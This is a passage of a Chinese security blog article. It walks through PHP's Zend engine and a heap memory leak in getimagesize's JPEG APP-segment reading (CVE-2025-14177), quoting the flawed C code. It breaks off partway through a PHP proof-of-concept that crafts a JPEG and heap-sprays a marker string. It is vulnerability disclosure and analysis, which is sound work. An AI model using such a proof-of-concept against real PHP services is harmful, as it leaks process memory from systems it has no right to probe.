---
title: 一次一口吃掉大象：PHP中与JPEG相关的内存安全漏洞
url: https://mp.weixin.qq.com/s/Hsdo8b1x8O9Tbk4fIuxOaA
source: Doonsec's feed
date: 2026-05-17
fetch_date: 2026-05-18T06:08:59.786468
---

# 一次一口吃掉大象：PHP中与JPEG相关的内存安全漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeCGwySHb14vlHlpUS1OOsnaMYA6okw0BABib10vFYiaib53H4cUMb00LpJO9LRibC1FoYSMY2lORxE4HFAPj7cAZ96RvCATjy88AY/0?wx_fmt=jpeg)

# 一次一口吃掉大象：PHP中与JPEG相关的内存安全漏洞

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> PHP内核很少被视作攻击面，但ext/standard扩展里大量处理文件的C代码其实暗藏风险。本文拆解了两个真实漏洞：getimagesize函数在读取JPEG APP段时泄露堆内存（CVE-2025-14177），以及iptcembed函数在重新打包JPEG时发生堆缓冲区溢出。从Zend引擎架构讲起，到漏洞利用的PoC演示，整篇文章想告诉你，那些你以为很安全的原生函数，底层可能只是一段没做边界检查的C代码。

## 一份不常被审视的代码

PHP是全球使用率最高的语言之一。日常讨论安全时，人们总把目光放在框架和第三方库上，PHP内核本身很少成为焦点。但现实是，大量应用逻辑直接依赖ext/standard扩展里的内置函数——处理字符串、查询参数、数据格式和文件。我们翻了一遍这个扩展的C源码，发现了几处内存管理缺陷。下面挑两个典型的讲：getimagesize里的堆内存泄露，以及iptcembed里的堆缓冲区溢出。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibfTyCWMbBbjXwUjm8rLF9l44yLljTPcWbllFHnIiaia3kEC2kFp2SdCg6xXlsVnUysibeHt5CQMfAUviaUdjCuEhrXERInCzNLgVlc/640?wx_fmt=png&from=appmsg)

## Zend引擎：PHP的骨骼与肌肉

Zend Engine是PHP的开源C核心，负责解释和执行PHP代码。你查PHP版本时总能看到Zend Engine和Zend OPcache的字样：

$ ./sapi/cli/php -v
PHP 8.6.0-dev (cli) (built: Dec 11 2025 15:18:13) (NTS DEBUG)
Copyright (c) The PHP Group
Zend Engine v4.6.0-dev, Copyright (c) Zend Technologies
with Zend OPcache v8.6.0-dev, Copyright (c), by Zend Technologies

简单拆一下，Zend Engine包含这几个部分：

* Zend VM：执行子系统，像个引擎一样解释指令、管理调用栈、执行运算、调用扩展函数。从PHP 8开始，某些配置下还能通过JIT编译进一步优化。
* Zend Compiler：把PHP代码转成虚拟机认识的内部表示。先用词法分析器切词，再用语法分析器构建抽象语法树，最后准备执行。
* Zend Executor：操作码执行器，是Zend VM的运行时部分。它遍历op\_array，创建或更新调用帧，管理execute\_data，执行内置和用户定义的函数。核心逻辑主要在zend\_execute.c和生成的VM处理器里。
* Zend Memory Manager：PHP运行时的内存管理器，处理变量、数组、对象的内存分配与释放，用到引用计数和垃圾回收。现代版本高度优化，开销很低。
* Zend API：一套内部接口，用来写C扩展模块。注册函数和类、定义数据结构、操作zval都靠它。
* Zend Optimizer+ (OPcache)：把PHP脚本编译结果缓存到共享内存，后续请求就不用重新编译源码。它不算Zend VM核心解释器的一部分，但通常随PHP一起发布，生产环境都会开启。
* Zend Garbage Collector+：循环引用垃圾回收器。PHP主要靠引用计数管理内存，GC额外找出并释放那些因循环引用而无法通过引用计数回收的对象和数组。

## 一段PHP代码如何跑起来

PHP脚本在解释器内的执行生命周期可以简化为三个阶段：词法分析 → 解析和编译 → 执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdGJpCTz8z5W6Wc4GKCQc4mLqo3Cmcan2aYIFhc6cCR9GNg7of1dibfZmLMEhaA8dAU5CFvwQiarGFFpAOibAgNVNL2MU12gm4Ciag/640?wx_fmt=png&from=appmsg)

流程大致是这样：

* SAPI入口：执行总是从服务器API开始。这一层把PHP引擎与环境连接起来——无论是Web服务器（通过Apache模块或PHP-FPM的FastCGI）还是命令行。SAPI接收请求或命令，初始化执行环境，配置输出、头信息、限制参数，然后把控制权交给Zend Engine。
* PHP源码：引擎拿到脚本文本，作为编译或缓存的输入。
* OPcache（如果启用）：这是快速通道。Zend Engine会先检查OPcache，避免重复解析和编译。缓存命中时，引擎直接取现成的op\_array去执行；未命中就走词法分析、解析、编译，然后把结果存入OPcache。
* Tokenizer（词法分析器）：把PHP源码字符流切成词法单元——关键字、标识符、字面量等。
* Parser（语法分析器）：构建抽象语法树。在现代PHP版本里，AST是一个独立阶段，把语法分析和生成可执行指令分开。
* Zend Compiler：把AST翻译成内部可执行表示——op\_array结构。它包含操作码和相关数据，比如常量和字面量。
* Zend Executor：解释操作码并执行程序——分支、函数调用、值运算、异常处理等。执行期间，引擎调用内置函数和C扩展函数，并通过文件、网络、进程等与操作系统交互。内存和垃圾回收方面，请求期间的内存通常通过Zend Memory Manager分配，垃圾回收器在根缓冲区满等条件下触发，处理循环引用。
* JIT（可选；属于OPcache的一部分）：如果JIT开启，部分“热点”代码的执行可能从操作码解释切换到原生机器码。在PHP实现里，JIT是OPcache的一部分，用额外的共享内存区存储机器码，入口点与op\_array和操作码关联。
* 通过SAPI返回结果：执行结果通过SAPI返回给外部环境，可以是HTTP响应、控制台输出，也包括错误和退出码。

## 标准扩展：功能越多，攻击面越大

标准扩展（php-src/ext/standard）是PHP的基础扩展，提供了绝大多数开箱即用的函数。在典型构建里，这个扩展和解释器一起编译，注册了数百个过程式API：字符串和数组工具、URL和HTTP辅助函数、文件操作、流封装器，以及解析特定数据格式的代码。比如，用getimagesize处理JPEG元数据，就落在这个范围里。

从安全角度看，这里是敏感地带。ext/standard里的C代码经常处理不可控的输入——文件、请求载荷、参数——而且被广泛使用的PHP原语调用。所以，这儿的漏洞和缺陷影响范围通常极大。

## 缺陷一：getimagesize在读取JPEG APP段时泄露堆内存

CVE-2025-14177[1] 严重程度：中等，6.3/10

### 怎么回事

2025年11月，标准扩展里被发现一个bug：调用原生getimagesize函数，在某些条件下，通过$info返回的APP段数据（比如APP1）后面可能拖着未初始化的堆内存字节。我们把这个发现提交给厂商[2]，他们深入分析后将其定性为安全漏洞，分配了CVE-2025-14177。

getimagesize[3]函数用来获取图片文件的尺寸、类型、MIME以及可用于HTML IMG标签的字符串。通过image\_info参数，还能返回扩展信息，比如JPEG的APP标记。但这个机制只在JFIF文件上支持。

### 问题出在哪

核心问题在于：某些条件下，$info变量里返回的APPn数据与文件中的真实段内容不符。实际观察到两种现象：后续每个块都写到缓冲区开头，导致$info['APPn']的头几个字节对应最后读取的块；返回字符串的尾部可能包含从未填充的未初始化字节——即之前堆内存的残留。

这是典型的内存泄露。如果应用处理一张图片，然后用$info['APPn']操作用户文件，就存在泄露进程内存碎片的风险。触发这个漏洞需要多块读取。在JPEG文件里，APP段是包含元数据或辅助信息的特定段类型：EXIF数据（拍摄参数、GPS坐标）、IPTC信息（作者、关键词）、注释、创建者信息等。

一个JPEG文件由多个段组成，以SOI标记0xFFD8开头，后面跟一系列段。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibc0nwWgcawskSML23FFSQ7Cx5F3yrJhdYkjZqo6OYxyhFQ1PvNsCiaI9JrLFpzHquDN07wia40iaD8V7TSWpJn6xsKTzKKtG8adKk/640?wx_fmt=png&from=appmsg)

APP段（APP0–APP15）是带有标记0xFFE0…0xFFEF的元数据段，包含特定数据格式，比如EXIF、XMP。每个APP段有2字节长度字段和载荷。APP1（0xFFE1）尤其重要，通常存放EXIF和XMP数据，处理这个段会影响JPEG结构解析时的安全性。

JPEG中APP标记的用途如下表：

| 标记 | 十六进制 | 用途 |
| --- | --- | --- |
| APP0 | 0xFFE0 | JFIF / JFXX（缩略图扩展） |
| APP1 | 0xFFE1 | Exif / XMP |
| APP2 | 0xFFE2 | ICC配置文件 / FlashPix扩展 |
| APP3-APP7 | 0xFFE3-0xFFE7 | （未标准化） |
| APP8 | 0xFFE8 | SPIFF |
| APP9-APP11 | 0xFFE9-0xFFEB | （未标准化） |
| APP12 | 0xFFEC | Picture Info / Ducky |
| APP13 | 0xFFED | Photoshop图像资源（含IPTC） |
| APP14 | 0xFFEE | Adobe |
| APP15 | 0xFFEF | （未标准化） |

### 技术细节：块拼接错位

问题藏在php\_read\_APP函数和它的辅助读取函数php\_read\_stream\_all\_chunks（php-src/ext/standard/image.c）。思路很简单：APP段的长度已知，PHP分配N字节缓冲区，从流中读取载荷，然后把数据放到$info['APPn']。致命缺陷在这儿：emalloc分配的是未初始化内存，并返回指针。如果某些字节从未写入缓冲区，它们仍会通过add\_assoc\_stringl函数进入$info['APPn']。

static int php\_read\_APP(php\_stream \* stream, unsigned int marker, zval \*info)
{
    size\_t length;
    char \*buffer;
    char markername[16];
    zval \*tmp;

    length = php\_read2(stream);
    if (length < 2) { return 0; }
    length -= 2; /\* length includes itself \*/

    buffer = emalloc(length);

    if (php\_read\_stream\_all\_chunks(stream, buffer, length) != length) {
        efree(buffer);
        return 0;
    }

    snprintf(markername, sizeof(markername), "APP%d", marker - M\_APP0);
    if ((tmp = zend\_hash\_str\_find(Z\_ARRVAL\_P(info), markername, strlen(markername))) == NULL) {
        add\_assoc\_stringl(info, markername, buffer, length);
    }
    efree(buffer);
    return 1;
}

缺陷出在从流中拼接块时：php\_read\_stream\_all\_chunks中，read\_total计数器在增加，但php\_stream\_read宏总是把数据写到缓冲区起始地址，没有为已读取的字节加偏移。

static size\_t php\_read\_stream\_all\_chunks(php\_stream \*stream, char \*buffer, size\_t length)
{
    size\_t read\_total = 0;
    do {
        ssize\_t read\_now = php\_stream\_read(stream, buffer, length - read\_total);
        read\_total += read\_now;
        if (read\_now < stream->chunk\_size && read\_total != length) {
            return 0;
        }
    } while (read\_total < length);

    return read\_total;
}

举个例子，假设length=9000，chunk\_size=8192：第一次php\_stream\_read读取8192字节写到buffer[0..8191]；第二次读取808字节写到buffer[0..807]，把开头覆盖了；buffer[8192..8999]从未被填充，保持未写入状态。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcG6VJiaKEJgnHeywBWmoeVfItPDl7gVO4G7Wicg8yf2LlosHgu07NPTQ3yr49zwr6B2UpZU35BCQEdx31wkxubLmcB4Z6FmoVEk/640?wx_fmt=png&from=appmsg)

结果：php\_read\_APP函数认为读取成功，将length字节复制到$info['APPn']，可缓冲区开头被最后一个块覆盖，尾部仍为未初始化的垃圾数据。

### 从公开问题到安全漏洞

起初，这个问题看起来只在涉及流过滤器的罕见场景中出现。但厂商在修复时发现了一个关键细节：过滤器并不是严格前提。最初没有归类为安全问题，是因为复现时用了流过滤器，且假设只有真实图片文件才会被使用。但深入调查后发现，如果攻击者知道流的块大小（通常是默认值），即使处理普通图片也能利用。这种攻击更复杂，但可行。于是缺陷被重新归类为漏洞，发布了安全公告，分配CVE-2025-14177。

### 漏洞利用：两个概念验证

分类审查期间，我们写了两个PoC。按时间顺序呈现。

**PoC 1：通过php://filter复现**。这是最初提交给开发者的最小复现脚本。通过php://filter读取文件，强制运行时以多块方式读取APP1段。过滤器本身不是漏洞前提，只是触发缺陷的方便手段。脚本生成一个带大APP1段的最小合法JPEG，在堆上填充特定标记后释放，然后读取文件并比较返回的数据，查找泄露的标记。

<?php
// Minimal PoC: corruption/uninitialized memory leak when reading APP1 via php://filter
$file = \_\_DIR\_\_ . '/min.jpg';
// Make APP1 large enough so it is read in multiple chunks
$chunk = 8192;
$tail  = 123;
$payload = str\_repeat('A', $chunk) . str\_repeat('B', $chunk) . str\_repeat('X', $tail);
$app1Len = 2 + strlen($payload);
// Minimal JPEG: SOI + APP1 + SOF0(1x1) + EOI
$sof  = "\xFF\xC0" . pack('n', 11) . "\x08" . pack('n',1) . pack('n',1) . "\x01\x11\x00";
$jpeg = "\xFF\xD8" . "\xFF\xE1" . pack('n', $app1Len) . $payload . $sof . "\xFF\xD9";
file\_put\_contents($file, $jpeg);
// Mini heap-spray: fill heap with a marker and free it, so the C buffer
// can reuse those areas and return marker remnants in $info['APP1']
$marker = 'LEAK-MARKER-123!';
$spr = substr(str\_repeat($marker, intdiv(strlen($payload) + strlen($marker) - 1, strlen($marker))), 0, strlen($payload));
$spray = [];
for ($i = 0; $i < 512; $i++) {
  $x = $spr; $x[0] = chr($i & 0x7F); // Copy on write -> distinct allocations
  $spray[$i] = $x;
}
unset($spray, $x);
gc\_collect\_cycles();
// Read through a filter to enforce multiple reads
$sr...